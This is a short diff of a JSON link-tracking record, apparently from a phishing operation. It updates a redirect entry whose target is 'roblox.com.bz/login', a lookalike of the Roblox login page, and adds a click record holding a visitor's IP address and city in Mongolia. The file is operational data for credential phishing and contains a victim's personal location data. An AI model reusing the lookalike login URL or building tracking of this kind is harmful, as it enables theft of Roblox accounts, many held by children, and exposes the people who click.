@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 13,
+    "useCount": 14,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14267,6 +14267,14 @@
         "city": "Makati City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1778762772285,
+        "ip": "66.181.191.16",
+        "country": "Mongolia",
+        "city": "Ulan Bator",
+        "flag": "🇲🇳",
+        "countryCode": "MN"
       }
     ]
   }
